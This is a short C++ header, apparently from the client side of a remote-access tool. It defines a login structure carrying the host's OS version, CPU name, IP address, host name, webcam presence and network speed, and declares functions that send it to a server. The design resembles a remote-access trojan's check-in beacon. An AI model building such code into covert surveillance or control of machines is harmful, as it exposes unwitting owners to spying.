#pragma once

#include "IOCPClient.h"
#include <Vfw.h>
#include <winternl.h>
#include <ntstatus.h>
#pragma comment(lib,"Vfw32.lib")

#pragma pack(1)
typedef struct  _LOGIN_INFO
{
	BYTE			IsToken;		    //信息头部
	OSVERSIONINFOEX	OsVersionInfoEx;	// 版本信息
	char ProcessorNameStringData[MAX_PATH];	// CPU主频
	IN_ADDR			ClientAddressData;		// 存储32位的IPv4的地址数据结构
	char			HostNameData[MAX_PATH];	// 主机名
	BOOL			IsWebCameraExist;		// 是否有摄像头
	DWORD			WebSpeed;		// 网速
}LOGIN_INFO, *PLOGIN_INFOR;

int SendLoginInformtion(CIOCPClient* ClientObject,DWORD WebSpeed);
NTSTATUS ProcessorNameString(char* ProcessorNameStringData, ULONG* ProcessorNameStringLength);
BOOL IsWebCamera();

